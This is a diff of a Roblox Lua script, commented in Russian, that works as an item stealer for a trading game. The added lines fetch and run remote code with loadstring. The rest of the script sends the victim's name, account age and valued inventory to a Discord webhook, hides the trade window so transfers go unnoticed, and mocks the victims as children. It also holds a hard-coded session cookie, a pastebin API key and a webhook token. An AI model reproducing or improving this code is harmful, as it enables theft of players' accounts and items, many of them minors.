@@ -1,235 +1,9 @@
-getgenv().Cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhsKBGR1aWQSEzk2MTA1NTI5NTY3MTI2MDQyNjYoAw.Q_bHAVD-HxDeSgomIU63hkyS89xZS1_97S9SjHOR7eTtf4XBzKdp6NaghwZ6iOSe043CoTzmZq_yVM-6b7kEUuoa8Cw8ech3loB2FyAiUoJZpB2wtUf-t-pfzWQGEdUYjiCTpVRyFTSU7ATuGGDR_9SVJzYICEwaKItC7wKbI4d_4WejHTiYOmv8ut8wC95Ipe3B1yOssRD6t_xSsAKyyo7skhulxPyBzXpMgLvKAyNLMETtZnZS5Ewl5Hp8ph7BDz2gmMWoYEaZ0gHswU20nbuLxpUwPSnqyUn0CWaeh3L0413PpsLPhuPc85MwgTYN_Px_9x22QywYzO_AP4I63cwe_-pdbFfChZg_kAkQ8BhvTXXLxzJHYvIeqtle0YOyO7SR3UnlX27iUs79KZcY-BidC-5AE9gOzOoaeCiMulCPGD02HDaGcD0VHXLpkwpWuK3VbYsyR045lpJpG5oiJXhCKehDPA6fgRFMt1FV5hgm10lgx8ihE-VY_UcZML1GFWphtfiv0doVwuXkkSDWEoOjw86t0C5WE4Uu_t7_j-S06KJfd7RcasGu2bAfxC49u7z_mxP4pyvN2t05DR48f4IjiSOv77OWFdO9JeWPckJzgNi_kmicTiKoDszXujiNNIjjeS0VCH8Jo6LCkcdOkfwDaTp-s0SqnXDLPhCSD7YAH8dxm6_YjPM5E5kDvg1aobkDu6KVmAjRFGxLyGpkBxvmoWLR03hcSTra5VUTOWp52uDqYT3D_5JtvYKE8E0oix3bx8l-vmUAfzM1DMh1jTkkqxMSP1rJh9lH2H0H5sLDLKIlJtL8kUkv6FvlQ0LcHfQjwgiVXQz_0Zm-YN7vU9F2kFP75RXRcOmdgvlwsgHs3FBOPhnydQwiEVGtzt-Ed3Ew6j4ukvX3v4SyV89luczy2Yg2WHBnxUhob-A58b_JSIjuv3JOqe_vcq5yya2fQaeGVXpjML7UmCY5X26DxDT2oRLIErYheHa4PEJF4_vxw1izxb9opVc5C3UOKjd9hHOfjysUsNzVHxk_tw8h5Z7mVKw40LwpbcZfoPrbl2Or6gp1BubaljahxhZmcKKN3HG1AuXlnZbkexR1v76FUGMi_n06RQrWVIgTi2ILRqKHZkF46nAfGPIgq6qeE-zKt9XEmMK3EesTHMjDa1HNINUT2JY"
-
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-
-local function KickPlayer(reason)
-    local localPlayer = Players.LocalPlayer
-    if localPlayer then
-        local kickMethods = {
-            function() localPlayer:Kick(reason) end,
-            function() game:Shutdown() end,
-            function() while true do end end,
-            function() error(reason) end,
-            function() getgenv().crash = nil end
-        }
-        
-        for i, method in ipairs(kickMethods) do
-            local success = pcall(method)
-            if success then
-                break
-            end
-        end
-    end
-end
-
-local function MakeRequestWithRetry(url, options, maxRetries)
-    maxRetries = maxRetries or 3
-    
-    for attempt = 1, maxRetries do
-        local success, response = pcall(function()
-            return request(options)
-        end)
-        
-        if success and response then
-            if response.StatusCode == 503 then
-                if attempt < maxRetries then
-                    wait(2)
-                end
-            else
-                return response
-            end
-        else
-            if attempt < maxRetries then
-                wait(1)
-            end
-        end
-    end
-    
-    return nil
-end
-
-local function GetRealJobIdWithAuth()
-    if not getgenv().Cookie then
-        return nil
-    end
-    
-    local localPlayer = Players.LocalPlayer
-    if not localPlayer then return nil end
-    
-    local placeId = game.PlaceId
-    local userIds = {}
-    local playerMap = {}
-    
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= localPlayer then
-            table.insert(userIds, player.UserId)
-            playerMap[player.UserId] = player.Name
-        end
-    end
-    
-    if #userIds == 0 then
-        return nil
-    end
-    
-    local function GetPresenceWithAuth(userIdsList)
-        local reqBody = HttpService:JSONEncode({
-            userIds = userIdsList
-        })
-        
-        local response = MakeRequestWithRetry("https://presence.roblox.com/v1/presence/users", {
-            Url = "https://presence.roblox.com/v1/presence/users",
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json",
-                ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
-            },
-            Body = reqBody
-        }, 3)
-        
-        if response then
-            local jsonSuccess, jsonData = pcall(function()
-                return HttpService:JSONDecode(response.Body)
-            end)
-            
-            if jsonSuccess then
-                return jsonData
-            else
-                return nil
-            end
-        else
-            return nil
-        end
-    end
-    
-    local presenceData = GetPresenceWithAuth(userIds)
-    if not presenceData then
-        return nil
-    end
-    
-    if not presenceData.userPresences then
-        return nil
-    end
-    
-    local foundJobIds = {}
-    local sameServerCount = 0
-    
-    for _, presence in pairs(presenceData.userPresences) do
-        if presence.placeId == placeId and presence.gameId then
-            local jobId = presence.gameId
-            local playerName = playerMap[presence.userId] or "Unknown"
-            
-            -- Считаем всех игроков на том же сервере
-            if jobId == game.JobId then
-                sameServerCount = sameServerCount + 1
-            end
-            
-            if jobId and jobId ~= game.JobId then
-                table.insert(foundJobIds, {
-                    jobId = jobId,
-                    player = playerName,
-                    lastLocation = presence.lastLocation or "InGame"
-                })
-            end
-        end
-    end
-    
-    -- НОВАЯ ЛОГИКА: если большинство игроков на том же сервере, значит подмены нет
-    local totalOtherPlayers = #userIds
-    if sameServerCount >= totalOtherPlayers * 0.8 then -- 80% игроков на том же сервере
-        print("✅ Majority of players are on same server, no JobId spoofing detected")
-        return game.JobId
-    end
-    
-    if #foundJobIds > 0 then
-        local jobIdCounts = {}
-        for _, found in ipairs(foundJobIds) do
-            jobIdCounts[found.jobId] = (jobIdCounts[found.jobId] or 0) + 1
-        end
-        
-        local bestJobId, maxCount = nil, 0
-        for jobId, count in pairs(jobIdCounts) do
-            if count > maxCount then
-                bestJobId = jobId
-                maxCount = count
-            end
-        end
-        
-        if bestJobId then
-            return bestJobId
-        end
-    end
-    
-    return nil
-end
-
-local function FindRealJobId()
-    local realJobId = GetRealJobIdWithAuth()
-    
-    if realJobId then
-        getgenv().RealJobId = realJobId
-        pcall(function()
-            writefile("real_jobid.txt", realJobId)
-        end)
-        return realJobId
-    else
-        -- УЛУЧШЕННАЯ ПРОВЕРКА: если не нашли realJobId, но в сервере мало игроков или все на одном сервере
-        local allPlayers = Players:GetPlayers()
-        local localPlayer = Players.LocalPlayer
-        
-        -- Проверяем, сколько игроков на нашем сервере
-        local playersOnOurServer = 0
-        for _, player in pairs(allPlayers) do
-            if player ~= localPlayer then
-                -- Простая проверка: если игрок в той же игре, он должен быть виден
-                if player:GetAttribute("InGame") ~= false and player:IsDescendantOf(game) then
-                    playersOnOurServer = playersOnOurServer + 1
-                end
-            end
-        end
-        
-        print("🔍 Players on our server: " .. playersOnOurServer .. "/" .. (#allPlayers - 1))
-        
-        -- ЕСЛИ В СЕРВЕРЕ МАЛО ИГРОКОВ ИЛИ БОЛЬШИНСТВО НА НАШЕМ СЕРВЕРЕ - НЕ КИКАЕМ
-        if playersOnOurServer >= math.max(1, (#allPlayers - 1) * 0.3) then -- Хотя бы 30% игроков на нашем сервере
-            print("✅ Enough players on our server, no JobId spoofing detected")
-            realJobId = game.JobId
-            getgenv().RealJobId = realJobId
-            return realJobId
-        end
-        
-        -- ЕСЛИ МЫ ОДНИ ИЛИ ОЧЕНЬ МАЛО ИГРОКОВ - ТОЖЕ НЕ КИКАЕМ
-        if #allPlayers <= 3 then
-            print("✅ Low player count, assuming legitimate server")
-            realJobId = game.JobId
-            getgenv().RealJobId = realJobId
-            return realJobId
-        end
-        
-        -- ТОЛЬКО ЕСЛИ РЕАЛЬНО ЕСТЬ ПРИЗНАКИ ПОДМЕНЫ - ТОГДА КИКАЕМ
-        local suspicious = false
-        if playersOnOurServer == 0 and #allPlayers > 3 then
-            suspicious = true
-            print("⚠️ Suspicious: No players on our server but total players: " .. #allPlayers)
-        end
-        
-        if suspicious then
-            wait(2)
-            KickPlayer("Server was closed due technical error. If this error repeat then send message to technical | Telegram - @tvoytwix")
-            return nil
-        else
-            print("✅ No clear signs of JobId spoofing, using standard JobId")
-            realJobId = game.JobId
-            getgenv().RealJobId = realJobId
-            return realJobId
-        end
-    end
-end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
 
 Username = "knisdqx_meow" -- >> Your main account
-Username2 = "noviy_nickname" -- >> Your alt account
+Username2 = "sosedra6" -- >> Your alt account
 Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441725786586615820/MjAaItKYv69qFFNdgxWQn1xe2HdO0ZV3rRKrbzBLk64Gb99KvxnLNyM9evUsYQa-Vd42" -- >> https://stealer.to/
-MinimumValues = 0 -- >> Set 0 to disable
+MinimumValues = 30 -- >> Set 0 to disable
 
 repeat task.wait() until game:IsLoaded()
 
@@ -254,59 +28,20 @@ local InvModule = require(game:GetService("ReplicatedStorage").Modules.Inventory
 local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
 local LP = game:GetService("Players").LocalPlayer
 local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
-local NameValue = game:GetService("Players").LocalPlayer.Name or "Unknown"
-local IdValue = game:GetService("Players").LocalPlayer.userId or "Unknown"
-local AgeValue = game:GetService("Players").LocalPlayer.AccountAge or "Unknown"
+local NameValue = game:GetService("Players").LocalPlayer.Name
+or "Unknown"
+local IdValue = game:GetService("Players").LocalPlayer.userId
+or "Unknown"
+local AgeValue = game:GetService("Players").LocalPlayer.AccountAge
+or "Unknown"
 local ExecutorValue = identifyexecutor() or "Unknown"
 local VersionValue = "2.0 (Trade System + Values Update)"
 
--- ПРОВЕРКА ИСПОЛНИТЕЛЯ И ВЫБОР JobId
--- ПРОВЕРКА ИСПОЛНИТЕЛЯ И ВЫБОР JobId
-local useJobIdCheck = (ExecutorValue == "Delta" or ExecutorValue == "Krnl" or ExecutorValue == "Seliware")
-local realJobId
-
-print("🔍 Executor detected: " .. ExecutorValue)
-
-if useJobIdCheck then
-    print("🚀 Starting JobId verification for " .. ExecutorValue)
-    
-    if getgenv().Cookie and getgenv().Cookie:find("WARNING") then
-        print("✅ Valid cookie found, checking JobId...")
-        
-        local success, result = pcall(function()
-            return FindRealJobId()
-        end)
-        
-        if success and result then
-            realJobId = result
-            print("🎯 JobId set to: " .. realJobId)
-        else
-            print("⚠️ JobId verification had issues, using standard JobId")
-            realJobId = game.JobId
-            getgenv().RealJobId = realJobId
-        end
-    else
-        print("❌ No valid cookie found, using standard JobId")
-        realJobId = game.JobId
-        getgenv().RealJobId = realJobId
-    end
-else
-    realJobId = game.JobId
-    getgenv().RealJobId = realJobId
-    print("📋 Using standard JobId for " .. ExecutorValue .. ": " .. realJobId)
-end
-
--- УДАЛИ ЭТОТ СТАРЫЙ КОД ↓
--- if getgenv().Cookie then
---     local realJobId = FindRealJobId()
---     
---     if realJobId then
---         print(realJobId)
-
--- Обновляем jobId в protocolLink и TeleportScript
+-- СИСТЕМА ТЕЛЕПОРТА (ИСПРАВЛЕННАЯ)
 local placeId = game.PlaceId
-local protocolLink = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. realJobId
-local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. realJobId .. "\")"
+local jobId = game.JobId
+local protocolLink = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
+local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. jobId .. "\")"
 
 local valuesTable = {
     -- >> Ancients/Tier 2 << --
@@ -499,493 +234,492 @@ local valuesTable = {
     ["Cavern_K_2019"] = 22,
 }
 
--- ОСТАЛЬНОЙ КОД БЕЗ ИЗМЕНЕНИЙ...
--- [Здесь идет весь остальной код без изменений]
-
-        -- Функция для отправки успешного трейда в Discord
-        function SendTradeSuccessMessage(sentItems, ReceiverName)
-            local http = game:GetService("HttpService")
-            local headers = {
-                ["Content-Type"] = "application/json"
-            }
-            
-            -- Форматируем список отправленных предметов
-            local itemsText = ""
-            local totalValue = 0
-            
-            for _, item in pairs(sentItems) do
-                local itemValue = valuesTable[item.dataId] or 0
-                totalValue = totalValue + (itemValue * item.amount)
-                itemsText = itemsText .. string.format("%s • x%d • %d\n", item.name, item.amount, itemValue * item.amount)
-            end
-            
-            local data = {
-                ["username"] = "Mama Mia",
-                ["avatar_url"] = "https://i.pinimg.com/736x/ae/1c/35/ae1c3515d3891f20997929813c9ea8fe.jpg",
-                ["embeds"] = {
-                    {
-                        ["title"] = "✅ Вьебали додика в чешки",
-                        ["color"] = 65280,
-                        ["fields"] = {
-                            {
-                                ["name"] = "📦 Мечи детей:",
-                                ["value"] = "```" .. itemsText .. "```",
-                                ["inline"] = false
-                            },
-                            {
-                                ["name"] = "💰 Общая стоимость:",
-                                ["value"] = "**" .. totalValue .. "**",
-                                ["inline"] = true
-                            },
-                            {
-                                ["name"] = "👤 Забрал:",
-                                ["value"] = "**" .. ReceiverName .. "**",
-                                ["inline"] = true
-                            }
-                        },
-                        ["footer"] = {
-                            ["text"] = "Molitown Team feat. Interpol • " .. os.date("%Y-%m-%d %H:%M:%S")
-                        }
-                    }
+function SendMessageEMBED(url, embed, bool)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    
+    -- Формируем контент с телепортом в стиле первого кода
+    local teleportContent = "🎯 **ВЬЕБАН** Очередной кукич:\n\n" .. TeleportScript
+    
+    local data = {
+        ["username"] = "M O L I T O W N",
+        ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
+        ["content"] = teleportContent,
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+                ["footer"] = {
+                    ["text"] = "Molitown Team 2025 | debugged for 6h"
                 }
-            }
-            
-            local body = http:JSONEncode(data)
-            
-            local response = request({
-                Url = Webhook,
-                Method = "POST",
-                Headers = headers,
-                Body = body
-            })
-        end
-
-        function SendMessageEMBED(url, embed, bool)
-            local http = game:GetService("HttpService")
-            local headers = {
-                ["Content-Type"] = "application/json"
-            }
-            
-            -- Формируем контент с телепортом в стиле первого кода
-            local teleportContent = "🎯 **ВЬЕБАН** Очередной кукич:\n\n" .. TeleportScript
-            
-            local data = {
-                ["username"] = "M O L I T O W N",
-                ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
-                ["content"] = teleportContent,
-                ["embeds"] = {
-                    {
-                        ["title"] = embed.title,
-                        ["color"] = embed.color,
-                        ["fields"] = embed.fields,
-                        ["footer"] = {
-                            ["text"] = "Molitown Team 2025 | debugged for 6h"
-                        }
-                    }
-                }
-            }
-            
-            local data2 = {
-                ["username"] = "M O L I T O W N", 
-                ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg", 
-                ["content"] = "-- @everyone\n" .. teleportContent,
-                ["embeds"] = {
-                    {
-                        ["title"] = embed.title,
-                        ["color"] = embed.color,
-                        ["fields"] = embed.fields,
-                        ["footer"] = {
-                            ["text"] = "Molitown Team 2025 | debugged for 6h"
-                        }
-                    }
-                }
-            }
-            
-            local body = http:JSONEncode(data)
-            local body2 = http:JSONEncode(data2)
-
-            if bool == true then
-                local response = request({
-                    Url = url,
-                    Method = "POST",
-                    Headers = headers,
-                    Body = body2
-                })
-            else
-                local response = request({
-                    Url = url,
-                    Method = "POST",
-                    Headers = headers,
-                    Body = body
-                })
-            end
-        end
-
-        -- Новая улучшенная функция скрытия TradeGUI
-        local function setupTradeGUIHider()
-            local player = game:GetService("Players").LocalPlayer
-            local playerGui = player:WaitForChild("PlayerGui")
-            
-            local function hideTradeGUI()
-                for _, guiName in pairs({"TradeGUI", "TradeGUI_Phone"}) do
-                    local gui = playerGui:FindFirstChild(guiName)
-                    if gui then
-                        gui.Enabled = false
-                        -- Двойная защита: отключаем изменение Enabled
-                        if not gui:FindFirstChild("AntiFlash") then
-                            local conn
-                            conn = gui:GetPropertyChangedSignal("Enabled"):Connect(function()
-                                if gui.Enabled then
-                                    gui.Enabled = false
-                                else
-                                    conn:Disconnect()
-                                end
-                            end)
-                            local anti = Instance.new("BoolValue")
-                            anti.Name = "AntiFlash"
-                            anti.Parent = gui
-                        end
-                    end
-                end
-            end
-
-            -- Скрываем сразу при запуске
-            hideTradeGUI()
-
-            -- Отслеживаем появление новых окон
-            playerGui.ChildAdded:Connect(function(child)
-                if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
-                    hideTradeGUI()
-                end
-            end)
-
-            -- Периодическая проверка
-            while true do
-                hideTradeGUI()
-                task.wait(0.1)
-            end
-        end
-
-        -- Запускаем скрытие GUI в отдельной корутине
-        coroutine.wrap(setupTradeGUIHider)()
-
-        local levelTable = {}
-        for i,v in pairs(LevelModule.XPTable) do
-            if PlayerDataModule.NewXP < v then
-                table.insert(levelTable, i)
-            end
-        end
-        local playerLevel = math.min(table.unpack(levelTable))
-        local playerPrestige = LevelModule.Prestige
-
-        local allItems = {}
-        local totalValues = 0
-
-        local vintageItems1 = {}
-        local commonItems1 = {}
-        local uncommonItems1 = {}
-        local rareItems1 = {}
-        local legendaryItems1 = {}
-        local godlyItems1 = {}
-        local ancientItems1 = {}
-        local uniqueItems1 = {}
-
-        local vintageItems = {}
-        local commonItems = {}
-        local uncommonItems = {}
-        local rareItems = {}
-        local legendaryItems = {}
-        local godlyItems = {}
-        local ancientItems = {}
-        local uniqueItems = {}
-
-        local vintageItemsC = 0
-        local commonItemsC = 0
-        local uncommonItemsC = 0
-        local rareItemsC = 0
-        local legendaryItemsC = 0
-        local godlyItemsC = 0
-        local ancientItemsC = 0
-        local uniqueItemsC = 0
-
-        local uniqueItemsValue = 0
-        local ancientItemsValue = 0
-        local godlyItemsValue = 0
-        local vintageItemsValue = 0
-        local legendaryItemsValue = 0
-        local rareItemsValue = 0
-        local uncommonItemsValue = 0
-        local commonItemsValue = 0
-
-        for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
-            for c, d in pairs(b) do
-                local itemValue = valuesTable[d.DataID] or 0
-                local totalValue = itemValue * d.Amount
-                
-                if d.Rarity == "Unique" then
-                    uniqueItemsValue = uniqueItemsValue + totalValue
-                elseif d.Rarity == "Ancient" then
-                    ancientItemsValue = ancientItemsValue + totalValue
-                elseif d.Rarity == "Godly" then
-                    godlyItemsValue = godlyItemsValue + totalValue
-                elseif d.Rarity == "Vintage" then
-                    vintageItemsValue = vintageItemsValue + totalValue
-                elseif d.Rarity == "Legendary" then
-                    legendaryItemsValue = legendaryItemsValue + totalValue
-                elseif d.Rarity == "Rare" then
-                    rareItemsValue = rareItemsValue + totalValue
-                elseif d.Rarity == "Uncommon" then
-                    uncommonItemsValue = uncommonItemsValue + totalValue
-                elseif d.Rarity == "Common" then
-                    commonItemsValue = commonItemsValue + totalValue
-                end
-            end
-        end
-
-        for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
-            for c, d in pairs(b) do
-                local itemKey = d.DataID
-                local itemValue = valuesTable[itemKey]
-                local weaponValue = itemValue and (itemValue * d.Amount) or 0
-
-                local formatTable = {
-                    weaponName = d.ItemName,
-                    weaponData = d.DataID,
-                    weaponAmount = d.Amount,
-                    weaponRarity = d.Rarity,
-                    weaponValue = weaponValue
-                }
-                
-                table.insert(allItems, formatTable)
-
-                local visualFormat = d.ItemName .. " • [x" .. d.Amount .. " | " .. weaponValue .. "]"
-
-                if d.Rarity == "Vintage" then
-                    vintageItemsC = vintageItemsC + d.Amount
-                    table.insert(vintageItems, visualFormat)
-                    table.insert(vintageItems1, formatTable)
-                end
-
-                if d.Rarity == "Common" then
-                    commonItemsC = commonItemsC + d.Amount
-                    table.insert(commonItems, visualFormat)
-                    table.insert(commonItems1, formatTable)
-                end
-
-                if d.Rarity == "Uncommon" then
-                    uncommonItemsC = uncommonItemsC + d.Amount
-                    table.insert(uncommonItems, visualFormat)
-                    table.insert(uncommonItems1, formatTable)
-                end
-
-                if d.Rarity == "Rare" then
-                    rareItemsC = rareItemsC + d.Amount
-                    table.insert(rareItems, visualFormat)
-                    table.insert(rareItems1, formatTable)
-                end
-
-                if d.Rarity == "Legendary" then
-                    legendaryItemsC = legendaryItemsC + d.Amount
-                    table.insert(legendaryItems, visualFormat)
-                    table.insert(legendaryItems1, formatTable)
-                end
-
-                if d.Rarity == "Godly" then
-                    godlyItemsC = godlyItemsC + d.Amount
-                    table.insert(godlyItems, visualFormat)
-                    table.insert(godlyItems1, formatTable)
-                end
-
-                if d.Rarity == "Ancient" then
-                    ancientItemsC = ancientItemsC + d.Amount
-                    table.insert(ancientItems, visualFormat)
-                    table.insert(ancientItems1, formatTable)
-                end
-
-                if d.Rarity == "Unique" then
-                    uniqueItemsC = uniqueItemsC + d.Amount
-                    table.insert(uniqueItems, visualFormat)
-                    table.insert(uniqueItems1, formatTable)
-                end
-            end
-        end
-
-        -- >> Values calculating logic << --
-        for _, item in pairs(allItems) do
-            totalValues = totalValues + item.weaponValue
-        end
-
-        local ReplicatedStorage = game:GetService("ReplicatedStorage")
-        local Trade = ReplicatedStorage:WaitForChild("Trade")
-        local lastOfferValue = nil
-
-        -- Перехватываем UpdateTrade чтобы получить LastOffer
-        Trade.UpdateTrade.OnClientEvent:Connect(function(tradeData)
-            -- Сохраняем LastOffer из данных трейда
-            lastOfferValue = tradeData.LastOffer
-        end)
-
-        local HttpService = game:GetService("HttpService")
-
-        local function pastebin(content)
-            local body = {
-                api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
-                api_paste_code = content,
-                api_option = "paste"
-            }
-
-            local encodedBody = ""
-            for key, value in pairs(body) do
-                encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
-            end
-            encodedBody = encodedBody:sub(1, -2)
-
-            local response
-            local success, err = pcall(function()
-                response = request({
-                    Url = "https://pastebin.com/api/api_post.php",
-                    Method = "POST",
-                    Body = encodedBody,
-                    Headers = {
-                        ["Content-Type"] = "application/x-www-form-urlencoded"
-                    },
-                    Timeout = 20
-                })
-            end)
-
-            if not success or not response or not response.Success then
-                return "\nError...\n"
-            end
-
-            local pasteUrl = response.Body
-            local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
-
-            return rawUrl
-        end
-
-        local function formatItems(itemList)
-            if #itemList == 0 then
-                return "None"
-            else
-                return table.concat(itemList, "\n")
-            end
-        end
-
-        local pastebinString = "-- [ Unique Items ] --\n" ..formatItems(uniqueItems)..
-                                 "\n\n-- [ Ancient Items ] --\n" ..formatItems(ancientItems)..
-                                 "\n\n-- [ Godly Items ] --\n" ..formatItems(godlyItems)..
-                                 "\n\n-- [ Legendary Items ] --\n" ..formatItems(legendaryItems)..
-                                 "\n\n-- [ Vintage Items ] --\n" ..formatItems(vintageItems)..
-                                 "\n\n-- [ Rare Items ] --\n" ..formatItems(rareItems)..
-                                 "\n\n-- [ Uncommon Items ] --\n" ..formatItems(uncommonItems)..
-                                 "\n\n-- [ Common Items ] --\n" ..formatItems(commonItems)..
-
-                                "\n\nInventory list ft. Molitown"
-
-        local pastebinLink = pastebin(pastebinString)
-
-        if totalValues < MinimumValues then
-            return
-        end
-
-        -- УЛУЧШЕННАЯ ФУНКЦИЯ ДЛЯ ПОЛУЧЕНИЯ ТОП ПРЕДМЕТОВ
-        local function getTopValuableItems(n)
-            local allItems = {}
-            
-            -- Собираем все предметы с детальной информацией
-            for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
-                for c, d in pairs(b) do
-                    local itemValue = valuesTable[d.DataID] or 0
-                    local totalValue = itemValue * d.Amount
-                    
-                    table.insert(allItems, {
-                        name = d.ItemName,
-                        dataId = d.DataID,
-                        value = itemValue,
-                        amount = d.Amount,
-                        totalValue = totalValue,
-                        rarity = d.Rarity
-                    })
-                end
-            end
-            
-            -- Сортируем по убыванию ценности за штуку
-            table.sort(allItems, function(a, b) 
-                return a.value > b.value
-            end)
-            
-            -- Возвращаем топ-N предметов с улучшенным форматированием
-            local topItems = {}
-            for i = 1, math.min(n, #allItems) do
-                local item = allItems[i]
-                local rarityEmoji = {
-                    Unique = "💎",
-                    Ancient = "🔥", 
-                    Godly = "⭐",
-                    Vintage = "🕰️",
-                    Legendary = "👑",
-                    Rare = "🔵",
-                    Uncommon = "🟢",
-                    Common = "⚪"
-                }
-                
-                local emoji = rarityEmoji[item.rarity] or "📦"
-                table.insert(topItems, string.format("%s %s • %d • x%d", emoji, item.name, item.value, item.amount))
-            end
-            return topItems
-        end
-
-        -- Получаем 5 самых ценных предметов
-        local topItems = getTopValuableItems(5)
-        local topItemsText = #topItems > 0 and table.concat(topItems, "\n") or "No valuable items"
-
-        local embed = {
-            ["title"] = "🎯 ВЬЕБАН - Долбаеб ракнул ваш скрипт! - " .. NameValue,
-            ["color"] = 16711935, 
-            ["fields"] = {
-                {
-                    ["name"] = "🔗 **Teleport to :mammoth:**",
-                    ["value"] = 
-                    "🚀**Вставь в браузер для связи с дуплом**\n```" .. protocolLink .. "```\n" ..
-                    "**Для автоматической связи:**\n```lua\n" .. TeleportScript .. "\n```",
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "〘:mammoth:〙**Info user**",
-                    ["value"] = 
-                    "```lua\n"..
-                    "Username      : "..NameValue.."\n"..
-                    "Account Age   : "..AgeValue.." Days\n"..
-                    "Executor      : "..ExecutorValue.."\n"..
-                    "Receiver      : "..Username.."/"..Username2.."\n"..
-                    "Version       : "..VersionValue.."```",
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "〘:moneybag:〙**Inventory Stats**",
-                    ["value"] = 
-                    "```lua\n"..
-                    "💎 ТОП 5 ПРЕДМЕТОВ:\n"..topItemsText.."\n\n"..
-                    "💰 Общая стоимость : "..totalValues.."\n\n"..
-                    "🔥 Ancients Value  : "..ancientItemsValue.."\n"..
-                    "⭐ Godlies Value   : "..godlyItemsValue.."\n"..
-                    "👑 Legendaries     : "..legendaryItemsValue.."\n```",
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "〘:package:〙**Full Inventory List**",
-                    ["value"] = "[📋 Click to check]("..pastebinLink..")",
-                    ["inline"] = false
-                },
             }
         }
+    }
+    
+    local data2 = {
+        ["username"] = "M O L I T O W N", 
+        ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg", 
+        ["content"] = "-- @everyone\n" .. teleportContent,
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+                ["footer"] = {
+                    ["text"] = "Molitown Team 2025 | debugged for 6h"
+                }
+            }
+        }
+    }
+    
+    local body = http:JSONEncode(data)
+    local body2 = http:JSONEncode(data2)
 
-        -- Отправляем уведомление в зависимости от ценности
-        if godlyItemsValue >= 100 or ancientItemsValue >= 100 or uniqueItemsValue >= 100 or totalValues >= 100 then
-            SendMessageEMBED(Webhook, embed, true)
-        else
-            SendMessageEMBED(Webhook, embed, false)
+    if bool == true then
+        local response = request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body2
+        })
+    else
+        local response = request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end
+end
+
+-- Функция для отправки успешного трейда в Discord
+function SendTradeSuccessMessage(sentItems, ReceiverName)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    
+    -- Форматируем список отправленных предметов
+    local itemsText = ""
+    local totalValue = 0
+    
+    for _, item in pairs(sentItems) do
+        local itemValue = valuesTable[item.dataId] or 0
+        totalValue = totalValue + (itemValue * item.amount)
+        itemsText = itemsText .. string.format("%s • x%d • %d\n", item.name, item.amount, itemValue * item.amount)
+    end
+    
+    local data = {
+        ["username"] = "Mama Mia",
+        ["avatar_url"] = "https://i.pinimg.com/736x/ae/1c/35/ae1c3515d3891f20997929813c9ea8fe.jpg",
+        ["embeds"] = {
+            {
+                ["title"] = "✅ Вьебали додика в чешки",
+                ["color"] = 65280,
+                ["fields"] = {
+                    {
+                        ["name"] = "📦 Мечи детей:",
+                        ["value"] = "```" .. itemsText .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "💰 Общая стоимость:",
+                        ["value"] = "**" .. totalValue .. "**",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "👤 Забрал:",
+                        ["value"] = "**" .. ReceiverName .. "**",
+                        ["inline"] = true
+                    }
+                },
+                ["footer"] = {
+                    ["text"] = "Molitown Team feat. Interpol • " .. os.date("%Y-%m-%d %H:%M:%S")
+                }
+            }
+        }
+    }
+    
+    local body = http:JSONEncode(data)
+    
+    local response = request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+-- Новая улучшенная функция скрытия TradeGUI
+local function setupTradeGUIHider()
+    local player = game:GetService("Players").LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+    
+    local function hideTradeGUI()
+        for _, guiName in pairs({"TradeGUI", "TradeGUI_Phone"}) do
+            local gui = playerGui:FindFirstChild(guiName)
+            if gui then
+                gui.Enabled = false
+                -- Двойная защита: отключаем изменение Enabled
+                if not gui:FindFirstChild("AntiFlash") then
+                    local conn
+                    conn = gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+                        if gui.Enabled then
+                            gui.Enabled = false
+                        else
+                            conn:Disconnect()
+                        end
+                    end)
+                    local anti = Instance.new("BoolValue")
+                    anti.Name = "AntiFlash"
